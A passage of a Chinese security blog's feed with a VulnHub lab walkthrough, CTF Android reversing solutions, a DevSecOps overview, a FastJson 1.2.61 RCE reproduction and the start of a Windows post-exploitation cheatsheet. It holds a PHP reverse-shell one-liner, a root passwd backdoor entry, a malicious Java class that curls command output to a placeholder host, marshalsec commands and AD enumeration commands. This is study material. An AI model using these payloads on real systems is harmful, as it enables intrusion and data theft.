        &lt;h2 id=&quot;什么是Apache-ZooKeeper？&quot;&gt;&lt;a href=&quot;#什么是Apache-ZooKeeper？&quot; class=&quot;headerlink&quot; title=&quot;什么是Apache ZooKeeper？&quot;&gt;&lt;/a&gt;什么是Apache ZooKeeper？&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub AI WEB 1.0</title>
    <link href="/2019/11/AI-WEB%201.0/"/>
    <id>/2019/11/AI-WEB 1.0/</id>
    <published>2019-11-06T08:39:05.000Z</published>
    <updated>2019-11-25T09:29:51.997Z</updated>
    
    <content type="html"><![CDATA[<p>加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。</p><p>扫描端口发现只有80的对外开放端口，访问发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682029896.png" alt="1572682029896"></p><p>扫描路径发现robots文件。其中两个路径文件，看样子是文件上传的地址。</p><p><img src="/2019/11/AI-WEB 1.0/1572682020738.png" alt="1572682020738"></p><p>访问其中地址，403</p><p><img src="/2019/11/AI-WEB 1.0/1572682335561.png" alt="1572682335561"></p><p>介于是403尝试访问上一级发现</p><p><img src="/2019/11/AI-WEB 1.0/1572682385016.png" alt="1572682385016"></p><p>尝试输入1，发现显示admin用户，那就是说可能这是个注入点。</p><p><img src="/2019/11/AI-WEB 1.0/1572682438951.png" alt="1572682438951"></p><p>检查是否存在注入，发现存在</p><p><img src="/2019/11/AI-WEB 1.0/1572683771039.png" alt="1572683771039"></p><p>查询systemUser库发现三个用户</p><p><img src="/2019/11/AI-WEB 1.0/1572688569479.png" alt="1572688569479"></p><pre><code>t00r      | FakeUserPassw0rd                    aiweb1pwn | MyEvilPass_f908sdaf9_sadfasf0sau3er      | N0tThis0neAls0</code></pre><p>扫描路径m3diNf0下的文件，发现如下地址。</p><pre><code>http://192.168.111.132/m3diNf0/info.php </code></pre><p>找到物理地址，利用sqlmap写shell</p><p><img src="/2019/11/AI-WEB 1.0/1572705709726.png" alt="1572705709726"></p><p>把给的路径加上物理地址都试一圈，发现如下地址是可写的。</p><pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></pre><p>利用sqlmap上传文件的小马来上传一句话，利用蚁剑连接</p><pre><code>http://192.168.111.132/se3reTdir777/uploads/a.php</code></pre><p>来到home目录下发现一个用户aiweb1。由于蚁剑的shell端是哑shell，反弹一个shell来提升。</p><pre><code>php -r &#39;$sock=fsockopen(&quot;10.102.45.228&quot;,8888);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre><p>获取shell后查看发现是较高版本的内核，理论上不是内核提权。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191102234632541.png" alt="image-20191102234632541"></p><p>查看passwd文件，发现存在账号aiweb1pwn。利用之前获得的账号登陆</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103002714448.png" alt="image-20191103002714448"></p><p>但是这个账号下并没有发现有用的东西，利用suid位也没找到有用的信息。上传LinEnum.sh。来检查有用的信息。</p><p>后来在查看文件信息的时候发现passwd文件居然属于www-data用户权限。</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103012733428.png" alt="image-20191103012733428"></p><p>这么说我这个账号还是多余的用来。</p><p>利用perl来生成加密的密码，账号密码admin</p><pre><code>perl -le &#39;print crypt(&quot;admin&quot;,&quot;123&quot;)&#39;  //12wGaKkN1hGuwadmin:12wGaKkN1hGuw:0:0:User_like_root:/root:/bin/bash</code></pre><p>直接在蚁剑中追加一行</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013158615.png" alt="image-20191103013158615"></p><p>sudo过来就已经是root权限</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013307387.png" alt="image-20191103013307387"></p><p>找到flag</p><p><img src="/2019/11/AI-WEB 1.0/image-20191103013329582.png" alt="image-20191103013329582"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;加载虚拟机后，由于没有账号暂不登录，通过虚拟机网段，查询DHCP分配的地址。&lt;/p&gt;
&lt;p&gt;扫描端口发现只有80的对外开放端口，访问发现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/11/AI-WEB 1.0/1572682029896.png&quot; alt=&quot;1572682
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>GitHub-Monitor</title>
    <link href="/2019/11/GitHub-Monitor/"/>
    <id>/2019/11/GitHub-Monitor/</id>
    <published>2019-11-06T04:41:49.000Z</published>
    <updated>2019-11-06T04:41:49.864Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GITHUB-MONTIOR"><a href="#GITHUB-MONTIOR" class="headerlink" title="GITHUB_MONTIOR"></a>GITHUB_MONTIOR</h2><blockquote><p>  python3 + Django 2.2.6 + supervisord</p></blockquote><ol><li>环境由简单的Django完成，外加一个HTML展示模板</li><li>GitHub的爬虫由supervisord来维护，需要修改配置文件内的信息，可以改成/var/run路径</li><li>pip安装如下的文件即可</li></ol><p>爬虫需要账号密码模拟登陆，进程为五分钟一次。是否扫描根据任务数据里保存的时间来做判断。</p><p>修改任务只需要在编辑里输入任务名，直接输入其他参数更新即可。</p><p>数据库采用MySQL5.7。</p><pre><code>python3 manager.py createsuperuserpython3 manager.py makemigrationspython3 manager.py migrate登陆后台添加一个可以登陆前端的账号即可。</code></pre><p>地址：<a href="https://github.com/MisakiKata/github_monitor" target="_blank" rel="noopener">https://github.com/MisakiKata/github_monitor</a></p><p>首界面</p><p><img src="https://user-images.githubusercontent.com/27627614/68268529-83d12080-0091-11ea-8956-988a74a77da4.png" alt="1573011489137"></p><p>全部信息<img src="https://user-images.githubusercontent.com/27627614/68268531-8764a780-0091-11ea-8269-0288c1c879cb.png" alt="1573011512652"></p><p>未处理信息</p><p><img src="https://user-images.githubusercontent.com/27627614/68268533-8764a780-0091-11ea-8231-30c8635d2067.png" alt="1573011525234"></p><p>界面由于对js了解较少，没有采用比较nodejs类前端框架，当然也可以修改为自己喜欢的界面。</p><p>食用简单，望喜欢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;GITHUB-MONTIOR&quot;&gt;&lt;a href=&quot;#GITHUB-MONTIOR&quot; class=&quot;headerlink&quot; title=&quot;GITHUB_MONTIOR&quot;&gt;&lt;/a&gt;GITHUB_MONTIOR&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;  python3
      
    
    </summary>
    
    
      <category term="python" scheme="/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2018SUSCTF-Mobile题</title>
    <link href="/2019/10/2018SUSCTF-Mobile%E9%A2%98/"/>
    <id>/2019/10/2018SUSCTF-Mobile题/</id>
    <published>2019-10-23T08:29:20.000Z</published>
    <updated>2019-10-23T08:29:20.575Z</updated>
    
    <content type="html"><![CDATA[<h3 id="BabyAndroid"><a href="#BabyAndroid" class="headerlink" title="BabyAndroid"></a>BabyAndroid</h3><p>常规，JEB反编译</p><p><img src="https://i.loli.net/2019/10/23/XkQ8eD4UpbhTJ27.png" alt="1571714446839.png"></p><p>根据输入的字符串长度，第一位和97异或，后面跟v0的字符异或，把结果字符串转入a函数中。a函数首先把给出的常量字符串转为数组，把传入的字符串转化为bytes数组，再根据数组长度把每一位做for中&amp;和左移计算，结果为3267347723651E492C1D7E117C1946325D02432D493B0B62067B则为真。所以逆推，由于一次计算拼接两位，所以按照两位为一个字符计算。其中含有字母，调试得知是对应的十六进制数。</p><pre><code>#coding:utf-8strs = &quot;3267347723651E492C1D7E117C1946325D02432D493B0B62067B&quot;num = []for i in range(0, len(strs)):    num.append(strs[i])   #52nums = []id = 0while id &lt; 52:    for i in range(0,200):        if str((i &amp; 0xF0) &gt;&gt; 4) == num[id]:            if hex(i &amp; 15).replace(&#39;0x&#39;,&#39;&#39;).upper() == num[id+1]:                nums.append(i)                break    id = id + 2flag = []for i in range(0, len(nums)):    if i == 0:        first = nums[i] ^ 97        flag.append(first)    else:        sc = nums[i] ^ nums[i-1]        flag.append(sc)text = &#39;&#39;for i in flag:    text = text + chr(i)print(text)&gt;&gt;&gt; SUSCTF{We1come_to_Andr0id}</code></pre><p>后来看了其他资料，才发现a函数下面的for循环就是找16进制对应的十进制数，如</p><pre><code>&gt;&gt;&gt; int(&#39;32&#39;,16)50其中是利用50找到对应的十进制32.</code></pre><p>这个点卡了N久，看到一份别人的poc写的是相当简洁了。</p><h3 id="CrackMe"><a href="#CrackMe" class="headerlink" title="CrackMe"></a>CrackMe</h3><p>又是一个native层的APP。</p><p><img src="https://i.loli.net/2019/10/23/KqBnWwjlIS5kEY3.png" alt="1571734248316.png"></p><p>IDA打开伪代码</p><p><img src="https://i.loli.net/2019/10/23/hRUCb7HDjaY8VXx.png" alt="1571801738496.png"></p><p>根据汇编得知，中间for循环处操作的是数组</p><p><img src="https://i.loli.net/2019/10/23/UQV7blA3npsyeIh.png" alt="1571815444600.png"></p><p>其中v11是给出的数据块，按照int型，四位一个字段，正好28个字段。</p><p><img src="https://i.loli.net/2019/10/23/nfDS2o1K7k9pbvu.png" alt="1571815444618.png"></p><p>按照Java层逻辑和伪代码写出c代码为</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8};   //小端字节序    int v0[28] = {0};    int string[28] = {0};   //未定义,引入的参数变量    int i;    for (i=0; i&lt;28; i++){        if (i == 0){            v0[i] = string[i] ^ 0xFF;        }        else{            v0[i] = string[i] ^ string[i-1];        }    }    srand(0x133ED6B);    int v4[28] = {0};    for (i=0; i&lt;28; i++){        v4[i] = v0[i] - rand();        if (v11[i] != v4[i]){            int v10 = 0;            return v10;        }    int v10 = 1;    printf(&quot;%c&quot;,v10);    return v10;    }}</code></pre><p>也就是我们需要反向求出string的值</p><pre><code>#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    int v11[28] = {0x571a9693,0x23a96034,0x6a943d8c,0x1f9222ed,0x73887c81,0x5c13a257,0x26407522,0x13646a3a,0x2139537f,0x35415c5f,0x321304b7,0x238a8c26,0xd7307f6,0x622d5268,0x7c3d2e04,0x72198f7e,0x7df76af2,0x4e8431aa,0x28650861,0xfd8e3e9,0x196c1f1a,0x5fe8ab3,0x1231495d,0x5359d998,0x35fcfde0,0x3b2d0dd4,0x61113e45,0x314c57b8};    int v0[28] = {0};    srand(0x133ED6B);    for (int i=0; i&lt;28; i++){        v0[i] = v11[i] - rand();    }    int string[28] = {0};    for (int i=0; i&lt;28; i++){        if (i==0)            string[i] = v0[i] ^ 0xFF;        else{            string[i] = v0[i] ^ v0[i-1];        }    }    for (int i=0; i&lt;28; i++){        printf(&quot;%c&quot;, string[i]);    }    return 0;}</code></pre><p>但是尴尬的是算出来的是乱码</p><p><img src="https://i.loli.net/2019/10/23/qsJkNPHWw4FOmLV.png" alt="1571816373431.png"></p><p>然后没有找到这题的wp….也没找到其他问题的存在点。就这样吧，毕竟是汇编渣渣。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;BabyAndroid&quot;&gt;&lt;a href=&quot;#BabyAndroid&quot; class=&quot;headerlink&quot; title=&quot;BabyAndroid&quot;&gt;&lt;/a&gt;BabyAndroid&lt;/h3&gt;&lt;p&gt;常规，JEB反编译&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https:/
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>DevSecOps</title>
    <link href="/2019/10/DevSecOps/"/>
    <id>/2019/10/DevSecOps/</id>
    <published>2019-10-15T05:59:55.000Z</published>
    <updated>2019-10-15T09:22:42.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是-DevSecOps"><a href="#什么是-DevSecOps" class="headerlink" title="什么是 DevSecOps?"></a>什么是 DevSecOps?</h1><p>DevOps 不仅仅是开发和运营团队。如果您想要充分发挥出 DevOps 方法的敏捷性和响应力，则必须在应用的整个生命周期内同时兼顾 IT 安全性。</p><p>为什么？以往，安全性会在开发的最后阶段由特定的团队来负责实现。当开发周期长达数月、甚至数年时，上述做法不存在任何问题；但是，这种做法现在已经行不通了。有效的 DevOps 可顺利推进快速频繁的开发周期（有时全程只有数周或数天），但是过时的安全措施会对此造成负面影响，即使对于最高效的 DevOps 计划也是如此。</p><p><img src="https://i.loli.net/2019/10/15/K2QagWyBve19szV.png" alt="devsecopslinear405x259_0.png"></p><p>现在，安全防护在 DevOps 协作框架中属于共同责任，而且需要在整个周期中整合相应的安全功能。这是一个非常重要的理念。它还使得“DevSecOps”一词应运而生，以用于强调必须为 DevOps 计划打下扎实的安全基础。</p><p><img src="https://i.loli.net/2019/10/15/4ILjYnVaUBRWKsN.png" alt="devsecopscollab405x308_0.png"></p><p>DevSecOps 意味着，从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择正确的工具来持续确保安全性有助于实现安全目标。但是，有效的 DevOps 安全防护需要的不仅是新工具。它建立在 DevOps 文化变革的基础上，以便尽早集成安全团队的工作。</p><hr><h2 id="DevOps-安全性为内置特性"><a href="#DevOps-安全性为内置特性" class="headerlink" title="DevOps 安全性为内置特性"></a>DevOps 安全性为内置特性</h2><p>无论您将其称为“DevOps”还是“DevSecOps”，最好始终能在应用的整个生命周期内确保安全性。DevSecOps 关乎内置安全性，而不是应用和数据层面的安全性。如果将安全性问题留到开发流程的最后环节再加以考虑，那么采用 DevOps 方案的组织会发现自己的开发周期又变长了，而这是他们从一开始就想要避免的情况。</p><p>在某种程度上，DevSecOps 强调，在 DevOps 计划刚启动时就要邀请安全团队来确保信息的安全性，并制定自动安全防护计划。它还强调，要帮助开发人员从代码层面确保安全性；在这个过程中，安全团队需要针对已知的威胁分享可见性信息、提供反馈并进行智能分析。这可能还包括为开发人员提供新的安全培训，因为 DevSecOps 并非始终着眼于较为传统的应用开发模式。</p><p>那么，怎样才算是真正地实现了内置安全性？对于新手而言，优质的 DevSecOps 策略应能确定风险承受能力并进行风险/收益分析。在一个给定的应用中，需要配备多少个安全控制功能？对于不同的应用，上市速度又有多重要？自动执行重复任务是 DevSecOps 的关键所在，因为在管道中运行手动安全检查可能会非常耗时。</p><hr><h2 id="DevOps-安全性可自动实现"><a href="#DevOps-安全性可自动实现" class="headerlink" title="DevOps 安全性可自动实现"></a>DevOps 安全性可自动实现</h2><p>企业应该：确保采用时间短、频率高的开发周期；采取安全措施，以最大限度地缩短运营中断时间；采用创新技术，如容器和微服务；同时，还要促使常见的孤立团队加强合作 — 这对所有企业来说都是一项艰巨的任务。上述所有举措都与人有关，而且企业内部需要协同合作；但是，自动化才是有助于在 DevSecOps 框架中实现这些人员变化的关键所在。</p><p><img src="https://i.loli.net/2019/10/15/NPKhfVESyG4C2tj.png" alt="devsecopsautomation3549x160.png"></p><p>那么，企业应该在哪些方面实现自动化？具体又该怎么做呢？红帽提供了相应的书面指南来帮助解答上述问题。企业应该退后一步，并着眼于整个开发和运营环境。其中涉及：源控制存储库；容器注册表；持续集成和持续部署 (CI/CD) 管道；应用编程接口 (API) 的管理、编排和发布自动化；以及运营管理和监控。</p><p>全新的自动化技术已帮助企业提高了开发实践的敏捷性，还在推动采用新的安全措施方面起到了重要作用。但是，自动化并不是近年来 IT 领域发生的唯一变化。现在，对于大多数 DevOps 计划而言，容器和微服务等云原生技术也是一个非常重要的组成部分。所以，企业必须调整 DevOps 安全措施，以适应这些技术。</p><hr><h2 id="DevOps-安全性适用于容器和微服务"><a href="#DevOps-安全性适用于容器和微服务" class="headerlink" title="DevOps 安全性适用于容器和微服务"></a>DevOps 安全性适用于容器和微服务</h2><p>可通过容器实现的规模扩展和基础架构动态性提升改变了许多组织开展业务的方式。因此，DevOps 安全性实践必须适应新环境并遵循特定于容器的安全准则。云原生技术不适合用来落实静态安全策略和检查清单。相反，组织必须在应用和基础架构生命周期的每个阶段确保持续安全并整合相应的安全功能。</p><p>DevSecOps 意味着，要在应用开发的整个过程中确保安全性。要实现与管道的这种集成需要秉持一种全新的思维方式，就像使用新工具一样。考虑到这一点，DevOps 团队应该实现安全防护自动化，以保护整体环境和数据；同时实现持续集成/持续交付流程——可能还要确保容器中的微服务的安全性。</p><h3 id="环境和数据安全性："><a href="#环境和数据安全性：" class="headerlink" title="环境和数据安全性："></a>环境和数据安全性：</h3><h4 id="实现环境的标准化和自动化。"><a href="#实现环境的标准化和自动化。" class="headerlink" title="实现环境的标准化和自动化。"></a>实现环境的标准化和自动化。</h4><p>每项服务都应具有最小的权限，以最大限度地减少未经授权的连接和访问。</p><h4 id="实现用户身份和访问控制功能的集中化。"><a href="#实现用户身份和访问控制功能的集中化。" class="headerlink" title="实现用户身份和访问控制功能的集中化。"></a>实现用户身份和访问控制功能的集中化。</h4><p>由于要在多个点发起身份验证，因此严格的访问控制和集中式身份验证机制对于确保微服务安全性而言至关重要。</p><h4 id="使运行微服务的容器相互隔离并与网络隔离。"><a href="#使运行微服务的容器相互隔离并与网络隔离。" class="headerlink" title="使运行微服务的容器相互隔离并与网络隔离。"></a>使运行微服务的容器相互隔离并与网络隔离。</h4><p>这包括传输中和静止的数据，因为获取这两类数据是攻击者的高价值目标。</p><h4 id="加密应用与服务间的数据。"><a href="#加密应用与服务间的数据。" class="headerlink" title="加密应用与服务间的数据。"></a>加密应用与服务间的数据。</h4><p>具有集成式安全功能的容器编排平台有助于最大限度地降低发生未经授权访问的可能性。</p><h4 id="引入安全的-API-网关。"><a href="#引入安全的-API-网关。" class="headerlink" title="引入安全的 API 网关。"></a>引入安全的 API 网关。</h4><p>安全的 API 可提高授权和路由的可见性。通过减少公开的 API，组织可以减小攻击面。</p><h3 id="CI-CD-流程安全性："><a href="#CI-CD-流程安全性：" class="headerlink" title="CI/CD 流程安全性："></a>CI/CD 流程安全性：</h3><h4 id="集成适用于容器的安全性扫描程序。"><a href="#集成适用于容器的安全性扫描程序。" class="headerlink" title="集成适用于容器的安全性扫描程序。"></a>集成适用于容器的安全性扫描程序。</h4><p>应在向注册表添加容器的过程中实现这一点。</p><h4 id="自动在-CI-过程中完成安全性测试。"><a href="#自动在-CI-过程中完成安全性测试。" class="headerlink" title="自动在 CI 过程中完成安全性测试。"></a>自动在 CI 过程中完成安全性测试。</h4><p>其中包括在构建过程中运行安全性静态分析工具；而且在构建管道中提取任何预构建容器映像时，都要进行扫描，以检查是否存在已知的安全漏洞。</p><h4 id="在验收测试流程中加入针对安全性功能的自动化测试。"><a href="#在验收测试流程中加入针对安全性功能的自动化测试。" class="headerlink" title="在验收测试流程中加入针对安全性功能的自动化测试。"></a>在验收测试流程中加入针对安全性功能的自动化测试。</h4><p>自动执行输入验证测试，并针对验证操作实现身份验证和授权功能的自动化。</p><h4 id="自动执行安全性更新，例如针对已知漏洞打修补。"><a href="#自动执行安全性更新，例如针对已知漏洞打修补。" class="headerlink" title="自动执行安全性更新，例如针对已知漏洞打修补。"></a>自动执行安全性更新，例如针对已知漏洞打修补。</h4><p>通过 DevOps 实现这一点。这样，在创建记录在案的可跟踪更改日志时，管理员便无需登录生产系统。</p><h4 id="实现系统和服务配置管理功能的自动化。"><a href="#实现系统和服务配置管理功能的自动化。" class="headerlink" title="实现系统和服务配置管理功能的自动化。"></a>实现系统和服务配置管理功能的自动化。</h4><p>这样可以确保遵守安全策略，避免出现人为错误。审核和补救操作也应实现自动化。</p><p>以上信息来源：<a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops" target="_blank" rel="noopener">https://www.redhat.com/zh/topics/devops/what-is-devsecops</a></p><h1 id="DevSevOps-部分实现方案"><a href="#DevSevOps-部分实现方案" class="headerlink" title="DevSevOps 部分实现方案"></a>DevSevOps 部分实现方案</h1><p>DevSecOps的目标是在短时间内使各种能力的人提高安全性。传统安全性的出发点是，一旦设计了系统，便可以由安全人员确定其安全缺陷，并由业务运营商在发布系统之前对其进行纠正。这允许将有限的安全检查应用于项目，并且避免了在大型系统中增加安全测试环境的需要。但是，以这种方式设计的流程仅在业务活动步伐迅猛且各方都同意的情况下才有效。不幸的是，安全性必须得以保证的理念逐渐被要求后，这个迭代过程便存在安全缺陷，并且此后在系统内部造成了固有风险。</p><p><a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">archerysec</a>: 是一个开源漏洞评估和管理工具，可帮助开发人员和渗透测试人员执行扫描和管理漏洞。准确的说这并不是一个完整的DevSecOps实现方案，但是在一般的DevOps中，不需要对Sec进行较大的投入下，满足的基本安全性能保证。当然也可以理解为，开发人员人手一个AWVS、openVAS扫描。</p><p>Gitlab+Jenkins+SonarQube：实现动态的代码审计，自动拖代码扫描出结果。目前据所知，有不少企业在这种方式上，开发Sonar插件来进行代码审计的安全性维护。</p><p>后面会采用开源的安全架构来实现Sec的功能，内容希望可以类似<a href="https://bloodzer0.github.io/ossa/" target="_blank" rel="noopener">ossa</a>，但又没必要这么全面。同样部分开源工具也和DevSecOps没太大关系的，但既然DevSecOps是为了每一个人的安全，开源工具在中小型甲方就有较大意义了。</p><p>参考文章：</p><p><a href="https://www.linkedin.com/pulse/what-devsecops-shannon-lietz?trkInfo=VSRPsearchId%3A946311454203481351%2CVSRPtargetId%3A6008272002333294592%2CVSRPcmpt%3Aprimary&amp;trk=vsrp_influencer_content_res_name" target="_blank" rel="noopener">What is DevSecOps?</a></p><p><a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling" target="_blank" rel="noopener">Threat Modeling</a></p><p><a href="https://christian-schneider.net/slides/OWASP-AppSecEU-2015_SecDevOps.pdf" target="_blank" rel="noopener">OWASP-AppSecEU</a></p><p><a href="https://github.com/devsecops/awesome-devsecops" target="_blank" rel="noopener">awesome-devsecops</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么是-DevSecOps&quot;&gt;&lt;a href=&quot;#什么是-DevSecOps&quot; class=&quot;headerlink&quot; title=&quot;什么是 DevSecOps?&quot;&gt;&lt;/a&gt;什么是 DevSecOps?&lt;/h1&gt;&lt;p&gt;DevOps 不仅仅是开发和运营团队。如果您想要
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 1.2.61 RCE</title>
    <link href="/2019/10/FastJson-1-2-61-RCE/"/>
    <id>/2019/10/FastJson-1-2-61-RCE/</id>
    <published>2019-10-14T08:39:05.000Z</published>
    <updated>2019-10-14T08:46:38.187Z</updated>
    
    <content type="html"><![CDATA[<p>必备的jar包和Java 1.8.U20：</p><pre><code>fastjson-1.2.61.jarcommons-configuration2-2.0.jarcommons-lang3-3.3.2.jarcommons-logging-1.2.jar</code></pre><p>此处使用IDEA来做复现，首先导入这四个JAR包。创建使用POC的FastJsonTest。</p><p><img src="https://i.loli.net/2019/10/14/4br1TCwMXgzRdeO.png" alt="1571032870844.png"></p><p>此处使用RMI来做测试。同时创建一个恶意类，使用已经提供的恶意Java文件。</p><pre><code>import java.io.BufferedReader;import java.io.InputStreamReader;public class ExportObject {    public ExportObject() throws Exception {        Process proc = Runtime.getRuntime().exec(&quot;calc&quot;);        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));        StringBuffer sb = new StringBuffer();        String line;        while((line = br.readLine()) != null) {            sb.append(line).append(&quot;\n&quot;);        }        String result = sb.toString();        Exception e = new Exception(result);        throw e;    }    public static void main(String[] args) throws Exception {    }}</code></pre><p>当然也可以使用之前版本RCE的恶意Java文件。需要做监听，达到回显的目的。</p><pre><code>import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.InputStreamReader;public class Exploit {    public static String exec(String cmd) throws Exception {        String sb = &quot;&quot;;        BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(in));        String lineStr;        while ((lineStr = inBr.readLine()) != null)            sb += lineStr + &quot;\n&quot;;        inBr.close();        in.close();        return sb;    }    public Exploit() throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://x.x.x.x/&quot;+result;        throw new Exception(exec(cmd));    }    public static void main(String[] args) throws Exception {        String result = &quot;&quot;;        result = exec(&quot;whoami&quot;);        String cmd=&quot;curl http://x.x.x.x/&quot;+result;        throw new Exception(exec(cmd));    }}</code></pre><p>启动一个RMI监听服务</p><pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://localhost:8000/#ExportObject</code></pre><p>开启一个http服务</p><pre><code>python -m SimpleHTTPServer</code></pre><p>运行IDEA中的POC，发现可以弹出计算器。</p><p><img src="https://i.loli.net/2019/10/14/4ipBcDsJgeIR8Av.png" alt="2"></p><p>HTTP服务上也有请求的记录。</p><p><img src="https://i.loli.net/2019/10/14/jtrKFRiJhPX9dyM.png" alt="1571042112558.png"></p><p>POC地址：<a href="https://github.com/jas502n/fastjson-1.2.61-RCE" target="_blank" rel="noopener">https://github.com/jas502n/fastjson-1.2.61-RCE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;必备的jar包和Java 1.8.U20：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fastjson-1.2.61.jar
commons-configuration2-2.0.jar
commons-lang3-3.3.2.jar
commons-logging-1.2.jar
&lt;
      
    
    </summary>
    
    
      <category term="web安全" scheme="/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Windows Notes</title>
    <link href="/2019/10/Windows-Notes/"/>
    <id>/2019/10/Windows-Notes/</id>
    <published>2019-10-11T02:11:47.000Z</published>
    <updated>2019-10-11T02:16:20.073Z</updated>
    
    <content type="html"><![CDATA[<p>文章是对windows后渗透的利用，提权和持久化等做的详细利用方式。</p><p>原文搬运：<a href="https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html" target="_blank" rel="noopener">https://m0chan.github.io/2019/07/30/Windows-Notes-and-Cheatsheet.html</a></p><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h2 id="Basics"><a href="#Basics" class="headerlink" title="Basics"></a>Basics</h2><pre><code>net usersnet users /domainnet localgroupnet groups /domainnet groups /domain &quot;Domain Admins&quot;Get-ADUserGet-DomainGet-DomainUserGet-DomainGroupGet-DomainGroupMember -identity &quot;Domain Admins&quot; -Domain m0chanAD.local -DomainController 10.10.14.10Find-DomainShare#Host Discoverynetdiscover -r subnet/24nbtscan -r [range]for /L %i in (1,1,255) do  @ping.exe -n 1 -w 50 &lt;10.10.10&gt;.%i | findstr TTL#Reverse DNS Lookup$ComputerIPAddress = &quot;10.10.14.14&quot;[System.Net.Dns]::GetHostEntry($ComputerIPAddress).HostName</code></pre><p><a href="https://github.com/tevora-threat/SharpView" target="_blank" rel="noopener">https://github.com/tevora-threat/SharpView</a></p><h4 id="Users-with-SPN"><a href="#Users-with-SPN" class="headerlink" title="Users with SPN"></a>Users with SPN</h4><pre><code>Get-DomainUser -SPNGet-ADComputer -filter {ServicePrincipalName -like &lt;keyword&gt;} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</code></pre><h4 id="Kerberos-Enumeration"><a href="#Kerberos-Enumeration" class="headerlink" title="Kerberos Enumeration"></a>Kerberos Enumeration</h4><pre><code>nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=&#39;test&#39;</code></pre><h4 id="Red-Team-CSharp-Scripts"><a href="#Red-Team-CSharp-Scripts" class="headerlink" title="Red-Team CSharp Scripts"></a>Red-Team CSharp Scripts</h4><pre><code>#https://github.com/Mr-Un1k0d3r/RedTeamCSharpScriptsLDAPUtility.csUsage: ldaputility.exe options domain [arguments]ldaputility.exe DumpAllUsers m0chanldaputility.exe DumpUser m0chan mr.un1k0d3rldaputility.exe DumpUsersEmail m0chanldaputility.exe DumpAllComputers m0chan ldaputility.exe DumpComputer m0chan DC01ldaputility.exe DumpAllGroups m0chanldaputility.exe DumpGroup m0chan &quot;Domain Admins&quot;ldaputility.exe DumpPasswordPolicy m0chanAlso WMIUtility.cs for WMI Calls &amp; LDAPQuery.cs for Raw LDAP Queries.See github linked above for full details.</code></pre><h4 id="Active-Directory"><a href="#Active-Directory" class="headerlink" title="Active Directory"></a>Active Directory</h4><pre><code>nltest /DCLIST:DomainNamenltest /DCNAME:DomainNamenltest /DSGETDC:DomainName# Get Current Domain Info - Similar to Get-Domain[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()# Get Domain Trust Info - Similar to Get-DomainTrust([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()# View Domain Info[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()#  View Domain Trust Information([System.DirectoryServices.ActiveDirectory.Forest]::GetForest((New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(&#39;Forest&#39;, &#39;forest-of-interest.local&#39;)))).GetAllTrustRelationships()nltest [server:&lt;fqdn_foreign_domain&gt;] 